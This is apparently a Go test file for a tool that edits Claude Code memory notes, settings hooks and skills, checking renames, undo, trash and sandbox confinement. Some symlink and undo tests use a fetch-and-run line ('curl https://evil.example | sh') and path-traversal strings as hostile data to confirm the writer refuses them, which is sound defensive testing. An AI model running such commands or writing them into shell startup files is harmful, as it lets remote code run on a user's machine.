package write

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func setup(t *testing.T) (*Writer, string) {
	t.Helper()
	home := t.TempDir()
	w := New(home)
	n := 0
	w.Now = func() time.Time { n++; return time.Date(2026, 10, 1, 12, 0, n, 0, time.UTC) }
	dir := filepath.Join(home, ".claude", "projects", "-r", "memory")
	_ = os.MkdirAll(dir, 0o755)
	return w, dir
}

func put(t *testing.T, path, body string) {
	t.Helper()
	_ = os.MkdirAll(filepath.Dir(path), 0o755)
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func read(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func TestSetFrontmatterKeepsOtherKeysAndShape(t *testing.T) {
	src := "---\nname: old\ntype: project\noriginSessionId: abc\n---\nBody\n"
	out, err := SetFrontmatter([]byte(src), "new-name", `"quoted" then more`, "project")
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	for _, want := range []string{"name: new-name", "originSessionId: abc", "\ntype: project", "Body\n"} {
		if !strings.Contains(s, want) {
			t.Errorf("missing %q in:\n%s", want, s)
		}
	}
	if strings.Contains(s, "metadata") {
		t.Errorf("type must stay top-level, never migrated:\n%s", s)
	}
	if strings.Index(s, "name:") > strings.Index(s, "originSessionId") {
		t.Errorf("key order changed:\n%s", s)
	}
}

func TestSaveMemoryRenamesFileLinksAndIndex(t *testing.T) {
	w, dir := setup(t)
	a := filepath.Join(dir, "project_parity.md")
	b := filepath.Join(dir, "feedback_other.md")
	put(t, a, "---\nname: parity\ndescription: old\nmetadata:\n  type: project\n---\nold body\n")
	put(t, b, "---\nname: other\n---\nSee [[project_parity]] and [[parity|the parity note]].\n")
	put(t, filepath.Join(dir, "MEMORY.md"), "# Memory Index\n\n## Project\n- [Parity](project_parity.md) — old\n\n## Feedback\n- [Other](feedback_other.md) — x\n")

	newPath, err := w.SaveMemory(MemoryEdit{Path: a, Title: "Web iOS parity", Type: "project", Description: "what must match", Body: "new body"}, []string{a, b})
	if err != nil {
		t.Fatal(err)
	}
	if filepath.Base(newPath) != "project_web_ios_parity.md" || exists(a) {
		t.Fatalf("rename: %s (old still there: %v)", newPath, exists(a))
	}
	if got := read(t, newPath); !strings.Contains(got, "name: web-ios-parity") || !strings.Contains(got, "new body") {
		t.Fatalf("content:\n%s", got)
	}
	if got := read(t, b); got != "---\nname: other\n---\nSee [[web-ios-parity]] and [[web-ios-parity|the parity note]].\n" {
		t.Fatalf("links:\n%s", got)
	}
	idx := read(t, filepath.Join(dir, "MEMORY.md"))
	if !strings.Contains(idx, "## Project\n- [Web iOS parity](project_web_ios_parity.md) — what must match\n\n## Feedback") || strings.Contains(idx, "project_parity.md") {
		t.Fatalf("index:\n%s", idx)
	}
	if len(w.Versions(a)) != 1 || len(w.Versions(b)) != 1 {
		t.Fatal("previous versions must be snapshotted")
	}
	if trash, _ := os.ReadDir(w.Trash); len(trash) != 1 {
		t.Fatal("renamed-away file should be in the Trash")
	}
}

func TestSaveWithoutTitleKeepsNameAndLinks(t *testing.T) {
	w, dir := setup(t)
	a := filepath.Join(dir, "feedback_alert_on_failure_only.md")
	b := filepath.Join(dir, "o.md")
	put(t, a, "---\nname: feedback-alert-on-failure-only\ndescription: old\nmetadata:\n  type: feedback\n---\nbody\n")
	put(t, b, "see [[feedback-alert-on-failure-only]]\n")
	put(t, filepath.Join(dir, "MEMORY.md"), "- [Alert on failure](feedback_alert_on_failure_only.md) — old\n")
	if _, err := w.SaveMemory(MemoryEdit{Path: a, Description: "new", Body: "body"}, []string{a, b}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(read(t, a), "name: feedback-alert-on-failure-only") || read(t, b) != "see [[feedback-alert-on-failure-only]]\n" {
		t.Fatalf("name or link changed:\n%s\n%s", read(t, a), read(t, b))
	}
	if read(t, filepath.Join(dir, "MEMORY.md")) != "- [Alert on failure](feedback_alert_on_failure_only.md) — new\n" {
		t.Fatalf("index: %q", read(t, filepath.Join(dir, "MEMORY.md")))
	}
	// A title edit that keeps the same file still rewrites links aimed at the old name.
	if _, err := w.SaveMemory(MemoryEdit{Path: a, Title: "Alert on failure only", Description: "new", Body: "body"}, []string{a, b}); err != nil {
		t.Fatal(err)
	}
	if read(t, b) != "see [[alert-on-failure-only]]\n" { // the new name, as the [[ picker writes it
		t.Fatalf("link not rewritten after a name change: %q", read(t, b))
	}
}

func TestLockAndConflictRefuseWrites(t *testing.T) {
	w, dir := setup(t)
	a := filepath.Join(dir, "x.md")
	put(t, a, "---\nname: x\n---\n")
	seen := time.Now().Add(-time.Hour).UTC().Format(time.RFC3339)
	if _, err := w.SaveMemory(MemoryEdit{Path: a, Title: "x", Body: "b", Seen: seen}, nil); err != ErrChanged {
		t.Fatalf("stale editor copy: %v", err)
	}
	put(t, filepath.Join(dir, ".consolidate-lock"), "12345")
	if err := w.TrashMemory(a); err != ErrLocked {
		t.Fatalf("fresh lock: %v", err)
	}
	old := time.Now().Add(-2 * time.Hour)
	_ = os.Chtimes(filepath.Join(dir, ".consolidate-lock"), old, old)
	if err := w.TrashMemory(a); err != nil {
		t.Fatalf("a stale lock should not block: %v", err)
	}
}

func TestCreatePromoteRelinkRestore(t *testing.T) {
	w, dir := setup(t)
	global := filepath.Join(w.Home, ".claude", "projects", "-h", "memory")
	_ = os.MkdirAll(global, 0o755)
	p, err := w.CreateMemory(dir, "Missing note", "reference", "a stub", "TODO")
	if err != nil || filepath.Base(p) != "reference_missing_note.md" {
		t.Fatalf("create: %v %s", err, p)
	}
	if _, err := w.CreateMemory(dir, "Missing note", "reference", "", ""); err == nil {
		t.Fatal("create must not overwrite")
	}
	g, err := w.Move(p, global)
	if err != nil || exists(p) || !strings.Contains(read(t, filepath.Join(global, "MEMORY.md")), "](reference_missing_note.md) — a stub") {
		t.Fatalf("promote: %v", err)
	}
	if strings.Contains(read(t, filepath.Join(dir, "MEMORY.md")), "reference_missing_note") {
		t.Fatal("old index line should be gone")
	}
	other := filepath.Join(dir, "o.md")
	put(t, other, "x [[missing-note]] y [[keep]]\n")
	if n, err := w.Relink([]string{other}, []string{"missing-note"}, ""); err != nil || n != 1 || read(t, other) != "x missing note y [[keep]]\n" {
		t.Fatalf("unlink: %d %v %q", n, err, read(t, other))
	}
	if err := w.Restore(other, w.Versions(other)[0].Path); err != nil || read(t, other) != "x [[missing-note]] y [[keep]]\n" {
		t.Fatalf("restore: %v", err)
	}
	_ = g
}

func TestMigrationKeepsBodyExactly(t *testing.T) {
	src := "---\nname: x\ntype: feedback\n---\n\nBody with a blank line before it.\n"
	out, err := SetFrontmatter([]byte(src), "x", "", "feedback")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasSuffix(string(out), "---\n\nBody with a blank line before it.\n") {
		t.Fatalf("body changed:\n%q", out)
	}
}

func TestRepairFrontmatterQuotesBadYAML(t *testing.T) {
	w, dir := setup(t)
	a := filepath.Join(dir, "bad.md")
	put(t, a, "---\nname: bad\ndescription: \"no checks\" means conflicts\nmetadata:\n  type: project\n---\nbody\n")
	if err := w.SetType(a, ""); err != nil {
		t.Fatal(err)
	}
	got := read(t, a)
	if !strings.Contains(got, `description: '"no checks" means conflicts'`) || !strings.Contains(got, "body\n") {
		t.Fatalf("repaired:\n%s", got)
	}
}

func TestRemoveHooksAndMakeGlobal(t *testing.T) {
	w, _ := setup(t)
	s := filepath.Join(w.Home, "repo", ".claude", "settings.local.json")
	put(t, s, `{"permissions":{"allow":["x"]},"hooks":{"Stop":[{"hooks":[{"type":"command","command":"node ~/gone/hook.mjs"}]}],"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"keep.sh"},{"type":"command","command":"node ~/gone/hook.mjs"}]}]}}`)
	n, err := w.RemoveHooks(s, "~/gone/hook.mjs")
	if err != nil || n != 2 {
		t.Fatalf("remove hooks: %d %v", n, err)
	}
	got := read(t, s)
	if strings.Contains(got, "gone") || strings.Contains(got, `"Stop"`) || !strings.Contains(got, "keep.sh") || !strings.Contains(got, `"allow"`) {
		t.Fatalf("settings:\n%s", got)
	}
	if len(w.Versions(s)) != 1 {
		t.Fatal("previous settings should be kept as a version")
	}

	skill := "---\nname: explore\n---\nsame\n"
	var copies []string
	for _, r := range []string{"a", "b"} {
		p := filepath.Join(w.Home, r, ".claude", "skills", "explore", "SKILL.md")
		put(t, p, skill)
		copies = append(copies, p)
	}
	dst, err := w.MakeGlobal(copies)
	if err != nil || read(t, filepath.Join(dst, "SKILL.md")) != skill || exists(filepath.Dir(copies[0])) || exists(filepath.Dir(copies[1])) {
		t.Fatalf("make global: %v %s", err, dst)
	}
	put(t, filepath.Join(w.Home, "c", ".claude", "commands", "opsx", "apply.md"), "one")
	put(t, filepath.Join(w.Home, "d", ".claude", "commands", "opsx", "apply.md"), "two")
	if _, err := w.MakeGlobal([]string{filepath.Join(w.Home, "c", ".claude", "commands", "opsx", "apply.md"), filepath.Join(w.Home, "d", ".claude", "commands", "opsx", "apply.md")}); err == nil {
		t.Fatal("different copies must be refused")
	}
}

func TestRemoveHookAt(t *testing.T) {
	w, _ := setup(t)
	s := filepath.Join(w.Home, "settings.json")
	put(t, s, `{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"command":"a"},{"command":"b"}]}],"Stop":[{"hooks":[{"command":"c"}]}]}}`)
	if err := w.RemoveHookAt(s, "PreToolUse", 0, 0); err != nil {
		t.Fatal(err)
	}
	if err := w.RemoveHookAt(s, "Stop", 0, 0); err != nil {
		t.Fatal(err)
	}
	got := read(t, s)
	if strings.Contains(got, `"a"`) || !strings.Contains(got, `"b"`) || strings.Contains(got, "Stop") {
		t.Fatalf("settings:\n%s", got)
	}
	if err := w.RemoveHookAt(s, "PreToolUse", 0, 5); err == nil {
		t.Fatal("out-of-range position must fail")
	}
}

func TestConvertToAgentsMD(t *testing.T) {
	w, _ := setup(t)
	c := filepath.Join(w.Home, "r", "CLAUDE.md")
	put(t, c, "# Rules\n")
	dst, err := w.ConvertToAgentsMD(c)
	if err != nil || read(t, dst) != "# Rules\n" || exists(c) {
		t.Fatalf("convert: %v", err)
	}
	put(t, c, "again")
	if _, err := w.ConvertToAgentsMD(c); err == nil {
		t.Fatal("must refuse when AGENTS.md exists")
	}
}

func TestSandboxWritesCannotEscapeThroughSymlinks(t *testing.T) {
	real := t.TempDir() // stands in for a real config folder outside the sandbox
	w, _ := setup(t)
	_ = os.MkdirAll(filepath.Join(w.Home, ".claude"), 0o755)
	if err := os.Symlink(real, filepath.Join(w.Home, ".claude", "skills")); err != nil {
		t.Fatal(err)
	}
	skill := "---\nname: x\n---\nsame\n"
	var copies []string
	for _, r := range []string{"a", "b"} {
		p := filepath.Join(w.Home, r, ".claude", "skills", "x", "SKILL.md")
		put(t, p, skill)
		copies = append(copies, p)
	}
	if _, err := w.MakeGlobal(copies); err != ErrOutside {
		t.Fatalf("make-global through a symlink out of the sandbox: %v", err)
	}
	if entries, _ := os.ReadDir(real); len(entries) != 0 {
		t.Fatal("something was written outside the sandbox")
	}
	if err := w.File(filepath.Join(w.Home, ".claude", "skills", "y.md"), []byte("x")); err != ErrOutside {
		t.Fatalf("file write through symlink: %v", err)
	}
	if err := w.File(filepath.Join(w.Home, "ok", "new.md"), []byte("x")); err != nil {
		t.Fatalf("a normal sandbox write must still work: %v", err)
	}
}

func TestUndoReversesEveryKindOfChange(t *testing.T) {
	w, dir := setup(t)
	a := filepath.Join(dir, "project_parity.md")
	b := filepath.Join(dir, "o.md")
	idx := filepath.Join(dir, "MEMORY.md")
	put(t, a, "---\nname: parity\ndescription: old\nmetadata:\n  type: project\n---\nold\n")
	put(t, b, "see [[project_parity]]\n")
	put(t, idx, "- [Parity](project_parity.md) — old\n")
	snapshot := func() map[string]string {
		m := map[string]string{}
		for _, p := range []string{a, b, idx} {
			if bs, err := os.ReadFile(p); err == nil {
				m[p] = string(bs)
			}
		}
		return m
	}
	start := snapshot()
	check := func(name string) {
		t.Helper()
		got := snapshot()
		for k, v := range start {
			if got[k] != v {
				t.Fatalf("%s: %s not restored:\n%q\nwant\n%q", name, filepath.Base(k), got[k], v)
			}
		}
		if len(got) != len(start) || exists(filepath.Join(dir, "project_web_parity.md")) {
			t.Fatalf("%s: extra files left behind", name)
		}
	}
	// rename (file renamed, link rewritten, index updated) then undo
	w.Changes = nil
	if _, err := w.SaveMemory(MemoryEdit{Path: a, Title: "Web parity", Description: "new", Body: "new"}, []string{a, b}); err != nil {
		t.Fatal(err)
	}
	ops := w.Changes
	w.Changes = nil
	if err := w.Undo(ops); err != nil {
		t.Fatal(err)
	}
	check("rename")
	// trash then undo
	w.Changes = nil
	if err := w.TrashMemory(a); err != nil {
		t.Fatal(err)
	}
	ops = w.Changes
	if err := w.Undo(ops); err != nil {
		t.Fatal(err)
	}
	check("trash")
}

func TestUndoMakeGlobalAndRecordClaude(t *testing.T) {
	w, dir := setup(t)
	var copies []string
	for _, r := range []string{"a", "b"} {
		p := filepath.Join(w.Home, r, ".claude", "skills", "x", "SKILL.md")
		put(t, p, "same")
		copies = append(copies, p)
	}
	dst, err := w.MakeGlobal(copies)
	if err != nil {
		t.Fatal(err)
	}
	if err := w.Undo(w.Changes); err != nil {
		t.Fatal(err)
	}
	if exists(filepath.Join(dst, "SKILL.md")) || !exists(copies[0]) || !exists(copies[1]) {
		t.Fatal("make-global not undone")
	}
	// Claude edits a memory on disk: cca records it as a "claude" version, once.
	m := filepath.Join(dir, "m.md")
	put(t, m, "v1")
	if _, cur, _ := w.Record(m, "original"); cur == "" {
		t.Fatal("first sighting should be recorded")
	}
	put(t, m, "v2")
	prev, cur, _ := w.Record(m, "claude")
	if prev == "" || cur == "" {
		t.Fatal("Claude's change should be recorded with the previous version")
	}
	if _, cur, _ := w.Record(m, "claude"); cur != "" {
		t.Fatal("an unchanged file must not create another version")
	}
	if v := w.Versions(m); len(v) != 2 || v[0].Who != "claude" || v[1].Who != "original" {
		t.Fatalf("versions: %+v", v)
	}
}

func TestUnchangedHeaderValuesKeepTheirQuoting(t *testing.T) {
	src := "---\nname: x\ndescription: plain text (with + signs)\nmetadata:\n  type: project\n---\nbody\n"
	out, err := SetFrontmatter([]byte(src), "x", "plain text (with + signs)", "reference")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(out), "description: plain text (with + signs)\n") {
		t.Fatalf("unchanged value was re-quoted:\n%s", out)
	}
}

func TestCreateMemoryHasNoStrayDelimiters(t *testing.T) {
	w, dir := setup(t)
	p, err := w.CreateMemory(dir, "Hello there", "user", "greeting", "the body")
	if err != nil {
		t.Fatal(err)
	}
	if s := read(t, p); strings.Count(s, "---") != 2 || !strings.HasSuffix(s, "---\nthe body\n") {
		t.Errorf("bad file:\n%s", s)
	}
}

func TestSaveWithoutNameOrTypeDoesNotRename(t *testing.T) {
	w, dir := setup(t)
	for _, src := range []string{"---\ndescription: d\n---\nBody\n", "no header\n", "---\r\nname: foo\r\ntype: user\r\n---\r\nBody\r\n"} {
		p := filepath.Join(dir, "user_foo.md")
		put(t, p, src)
		got, err := w.SaveMemory(MemoryEdit{Path: p, Description: "d", Body: "Body"}, nil)
		if err != nil || got != p {
			t.Fatalf("%q: saved to %s, %v", src, got, err)
		}
		if s := read(t, p); !strings.Contains(s, "name: foo") || strings.Count(s, "---") != 2 {
			t.Errorf("%q: header not repaired:\n%s", src, s)
		}
	}
	// a retitle of a typeless file keeps its existing prefix
	p := filepath.Join(dir, "user_bar.md")
	put(t, p, "---\nname: bar\n---\nBody\n")
	got, err := w.SaveMemory(MemoryEdit{Path: p, Title: "Baz", Body: "Body"}, nil)
	if err != nil || filepath.Base(got) != "user_baz.md" {
		t.Errorf("retitle: %s, %v", got, err)
	}
}

func TestRestoreRefusesPathsOutsideItsVersions(t *testing.T) {
	w, dir := setup(t)
	p := filepath.Join(dir, "a.md")
	put(t, p, "mine\n")
	secret := filepath.Join(dir, "secret.txt")
	put(t, secret, "secret\n")
	for _, v := range []string{secret, w.snapDir(p) + "/../../../secret.txt", w.snapDir(p) + "/x/../../a.snap"} {
		if err := w.Restore(p, v); err == nil {
			t.Errorf("accepted %s", v)
		}
	}
	if read(t, p) != "mine\n" {
		t.Fatal("file was overwritten")
	}
}

func TestWritesThroughSymlinksAndKeepsModes(t *testing.T) {
	w, dir := setup(t)
	target := filepath.Join(t.TempDir(), "dotfiles", "CLAUDE.md")
	put(t, target, "old\n")
	link := filepath.Join(dir, "CLAUDE.md")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	w.Confine = "" // the target lives outside this test's home
	if err := w.File(link, []byte("new\n")); err != nil {
		t.Fatal(err)
	}
	if fi, _ := os.Lstat(link); fi.Mode()&os.ModeSymlink == 0 || read(t, target) != "new\n" {
		t.Fatal("symlink replaced instead of written through")
	}
	src := filepath.Join(dir, "skill")
	put(t, filepath.Join(src, "run.sh"), "#!/bin/sh\n")
	_ = os.Chmod(filepath.Join(src, "run.sh"), 0o755)
	dst := filepath.Join(dir, "copy")
	if err := w.copyTree(src, dst); err != nil {
		t.Fatal(err)
	}
	if fi, _ := os.Stat(filepath.Join(dst, "run.sh")); fi.Mode().Perm() != 0o755 {
		t.Fatalf("mode %v", fi.Mode().Perm())
	}
}

func TestSettingsRewriteKeepsCommandsAndNumbers(t *testing.T) {
	w, dir := setup(t)
	p := filepath.Join(dir, "settings.json")
	put(t, p, `{"n": 12345678901234567890, "hooks": {"Stop": [{"hooks": [{"type": "command", "command": "a && b > /tmp/x"}]}, {"hooks": [{"type": "command", "command": "gone.sh"}]}]}}`)
	if n, err := w.RemoveHooks(p, "gone.sh"); err != nil || n != 1 {
		t.Fatalf("%d %v", n, err)
	}
	s := read(t, p)
	if !strings.Contains(s, `a && b > /tmp/x`) || !strings.Contains(s, "12345678901234567890") {
		t.Fatalf("rewritten:\n%s", s)
	}
}

func TestFreedesktopTrash(t *testing.T) {
	w, dir := setup(t)
	data := t.TempDir()
	w.Trash, w.TrashInfo = filepath.Join(data, "Trash", "files"), true
	p := filepath.Join(dir, "my note.md")
	put(t, p, "x\n")
	dst, err := w.Remove(p)
	if err != nil {
		t.Fatal(err)
	}
	info := read(t, filepath.Join(data, "Trash", "info", "my note.md.trashinfo"))
	if !strings.HasPrefix(info, "[Trash Info]\nPath=") || !strings.Contains(info, "/my%20note.md\n") || !strings.Contains(info, "DeletionDate=2026-10-01T") {
		t.Fatalf("trashinfo:\n%s", info)
	}
	if filepath.Dir(dst) != w.Trash {
		t.Fatalf("moved to %s", dst)
	}
	if err := w.Undo(w.Changes); err != nil {
		t.Fatal(err)
	}
	if read(t, p) != "x\n" {
		t.Fatal("not restored")
	}
	if _, err := os.Stat(filepath.Join(data, "Trash", "info", "my note.md.trashinfo")); err == nil {
		t.Fatal("trashinfo left behind after undo")
	}
}

// Undo must not wipe an edit made after the change, and settings history keeps no env secrets.
func TestUndoKeepsLaterEditsAndHistoryKeepsNoEnv(t *testing.T) {
	w, _ := setup(t)
	s := filepath.Join(w.Home, ".claude", "settings.json")
	put(t, s, `{"env":{"API_KEY":"sk-secret"},"hooks":{"Stop":[{"hooks":[{"command":"a"}]}]}}`)
	if err := w.RemoveHookAt(s, "Stop", 0, 0); err != nil {
		t.Fatal(err)
	}
	changes := w.Changes
	_ = filepath.WalkDir(w.History, func(p string, d os.DirEntry, err error) error {
		if err == nil && !d.IsDir() && strings.Contains(read(t, p), "sk-secret") {
			t.Fatalf("a settings version kept an env secret: %s", p)
		}
		return nil
	})

	// Undo right away brings the hook back, with the env the file has now.
	w.Changes = nil
	if err := w.Undo(changes); err != nil {
		t.Fatal(err)
	}
	if got := read(t, s); !strings.Contains(got, `"a"`) || !strings.Contains(got, "sk-secret") {
		t.Fatalf("undo:\n%s", got)
	}

	// A deny rule added by hand after a change stops its undo.
	if err := w.RemoveHookAt(s, "Stop", 0, 0); err != nil {
		t.Fatal(err)
	}
	changes = w.Changes[len(w.Changes)-1:]
	put(t, s, strings.Replace(read(t, s), "{", `{"permissions":{"deny":["Bash(rm:*)"]},`, 1))
	if err := w.Undo(changes); err == nil || !strings.Contains(read(t, s), "deny") {
		t.Fatalf("undo wiped a later edit: %v\n%s", err, read(t, s))
	}
}

// Links stay links' business: nothing a symlink points at is copied into a repo or another folder,
// and a file too big to have been read whole is never replaced.
func TestSymlinksAndOversizedFilesAreLeftAlone(t *testing.T) {
	w, _ := setup(t)
	secret := filepath.Join(w.Home, "key")
	put(t, secret, "PRIVATE")
	src, dst := filepath.Join(w.Home, "r", ".claude", "skills", "s"), filepath.Join(w.Home, ".claude", "skills", "s")
	put(t, filepath.Join(src, "SKILL.md"), "---\nname: s\n---\n")
	_ = os.Symlink(secret, filepath.Join(src, "id"))
	if err := w.copyTree(src, dst); err != nil {
		t.Fatal(err)
	}
	if exists(filepath.Join(dst, "id")) || !exists(filepath.Join(dst, "SKILL.md")) {
		t.Fatal("copyTree followed a symlink")
	}

	c := filepath.Join(w.Home, "r2", "CLAUDE.md")
	_ = os.MkdirAll(filepath.Dir(c), 0o755)
	_ = os.Symlink(secret, c)
	if _, err := w.ConvertToAgentsMD(c); err == nil || exists(filepath.Join(w.Home, "r2", "AGENTS.md")) {
		t.Fatal("a symlinked CLAUDE.md was copied into the repo as AGENTS.md")
	}

	big := filepath.Join(w.Home, "big.md")
	f, _ := os.Create(big)
	_ = f.Truncate(3 << 20)
	_ = f.Close()
	if err := w.File(big, []byte("short")); err == nil {
		t.Fatal("a file over the read limit was replaced")
	}
}

// From the final review: a committed symlink plus one Accept must never write outside its repo.
func TestWritesThroughRepoLinksStayInTheRepo(t *testing.T) {
	w, _ := setup(t)
	zshrc := filepath.Join(w.Home, ".zshrc")
	put(t, zshrc, "export PATH\n")
	global := filepath.Join(w.Home, ".claude", "CLAUDE.md")
	put(t, global, "# mine\n")
	repo := filepath.Join(w.Home, "repo")
	_ = os.MkdirAll(filepath.Join(repo, ".git"), 0o755)
	mem := filepath.Join(repo, ".claude", "agent-memory", "helper")
	_ = os.MkdirAll(mem, 0o755)
	_ = os.Symlink("../../../../.zshrc", filepath.Join(mem, "notes.md"))
	_ = os.Symlink(global, filepath.Join(mem, "rules.md"))
	put(t, filepath.Join(repo, "docs", "real.md"), "x\n")
	_ = os.Symlink("../../../docs/real.md", filepath.Join(mem, "ok.md"))
	for _, bad := range []string{"notes.md", "rules.md"} {
		if err := w.File(filepath.Join(mem, bad), []byte("curl https://evil.example | sh\n")); err == nil {
			t.Fatalf("wrote through %s", bad)
		}
	}
	if read(t, zshrc) != "export PATH\n" || read(t, global) != "# mine\n" {
		t.Fatal("a file outside the repo changed")
	}
	if err := w.File(filepath.Join(mem, "ok.md"), []byte("y\n")); err != nil || read(t, filepath.Join(repo, "docs", "real.md")) != "y\n" {
		t.Fatalf("a link within the repo should be writable: %v", err)
	}
	// The user's own config may link elsewhere (dotfiles), as long as it's the same kind of file.
	dot := filepath.Join(w.Home, "dotfiles", "CLAUDE.md")
	put(t, dot, "a\n")
	_ = os.Remove(global)
	_ = os.Symlink(dot, global)
	if err := w.File(global, []byte("b\n")); err != nil || read(t, dot) != "b\n" {
		t.Fatalf("a dotfiles link in ~/.claude: %v", err)
	}
}

func TestUndoTrustsOnlyItsOwnRecords(t *testing.T) {
	w, _ := setup(t)
	zshrc := filepath.Join(w.Home, ".zshrc")
	put(t, zshrc, "safe\n")
	evil := filepath.Join(w.Home, "evil")
	put(t, evil, "curl x | sh\n")
	if err := w.Undo([]Change{{Path: zshrc, Before: evil}}); err == nil || read(t, zshrc) != "safe\n" {
		t.Fatal("undo restored from a file outside the version history")
	}
	if err := w.Undo([]Change{{Path: filepath.Join(w.Home, "x"), Trashed: evil}}); err == nil {
		t.Fatal("undo brought back something that isn't in the Trash")
	}
}

func TestMakeGlobalLeavesLinkedCopiesAlone(t *testing.T) {
	w, _ := setup(t)
	shared := filepath.Join(w.Home, "shared", "x")
	put(t, filepath.Join(shared, "SKILL.md"), "---\nname: x\n---\n")
	var copies []string
	for _, r := range []string{"a", "b"} {
		d := filepath.Join(w.Home, r, ".claude", "skills")
		_ = os.MkdirAll(d, 0o755)
		_ = os.Symlink(shared, filepath.Join(d, "x"))
		copies = append(copies, filepath.Join(d, "x", "SKILL.md"))
	}
	if _, err := w.MakeGlobal(copies); err == nil || !exists(filepath.Join(w.Home, "a", ".claude", "skills", "x")) {
		t.Fatal("make-global trashed links to a shared skill")
	}
}

func TestIndexLineMatchesOnlyItsOwnLink(t *testing.T) {
	w, dir := setup(t)
	idx := filepath.Join(dir, "MEMORY.md")
	put(t, idx, "- [Other](o.md) — keep me, see [b](user_victim.md)\n- [Victim](user_victim.md) — old\n")
	if err := w.IndexUpsert(idx, "user_victim.md", "Victim", "new", "user"); err != nil {
		t.Fatal(err)
	}
	if got := read(t, idx); !strings.Contains(got, "keep me") || !strings.Contains(got, "- [Victim](user_victim.md) — new") {
		t.Fatalf("a mention in another line's description was treated as that line:\n%s", got)
	}
}

// A header that isn't valid YAML (a quoted phrase with more text after it) keeps every other key
// when saved; one that can't be repaired is refused rather than rebuilt.
func TestSetFrontmatterKeepsKeysOfABrokenHeader(t *testing.T) {
	src := "---\nname: flags\ndescription: \"Flags\" live in LaunchDarkly\nmodified: 2026-09-30\nmetadata:\n  originSessionId: abc\n  type: reference\n---\nBody\n"
	out, err := SetFrontmatter([]byte(src), "flags", "Flags live in LaunchDarkly", "reference")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"modified: 2026-09-30", "originSessionId: abc", "description: Flags live in LaunchDarkly", "type: reference", "---\nBody\n"} {
		if !strings.Contains(string(out), want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if _, err := SetFrontmatter([]byte("---\nname: [unclosed\nmodified: x\n---\nBody\n"), "n", "d", ""); err == nil {
		t.Error("an unrepairable header must be refused, not rebuilt without its keys")
	}
}

// A type Claude Code adds later survives a save; changing to an unknown type is refused.
func TestSaveMemoryKeepsAnUnknownType(t *testing.T) {
	w, dir := setup(t)
	p := filepath.Join(dir, "note.md")
	os.WriteFile(p, []byte("---\nname: note\ndescription: d\ntype: decision\n---\nBody\n"), 0o644)
	if _, err := w.SaveMemory(MemoryEdit{Path: p, Type: "decision", Description: "d2", Body: "Body"}, []string{p}); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(p); !strings.Contains(string(b), "type: decision") {
		t.Errorf("type changed:\n%s", b)
	}
	if _, err := w.SaveMemory(MemoryEdit{Path: p, Type: "other", Body: "Body"}, []string{p}); err == nil {
		t.Error("changing to an unknown type must be refused")
	}
}

// Claude Code leaves a blank line after the header; saving only the summary keeps the body as is.
func TestSaveMemoryKeepsTheBlankLineAfterTheHeader(t *testing.T) {
	w, dir := setup(t)
	p := filepath.Join(dir, "feedback_x.md")
	put(t, p, "---\nname: x\ndescription: old\nmetadata:\n  type: feedback\n---\n\nThe rule.\n")
	if _, err := w.SaveMemory(MemoryEdit{Path: p, Description: "new", Body: "The rule."}, []string{p}); err != nil {
		t.Fatal(err)
	}
	if got := read(t, p); !strings.HasSuffix(got, "---\n\nThe rule.\n") || !strings.Contains(got, "description: new") {
		t.Fatalf("saved:\n%q", got)
	}
}
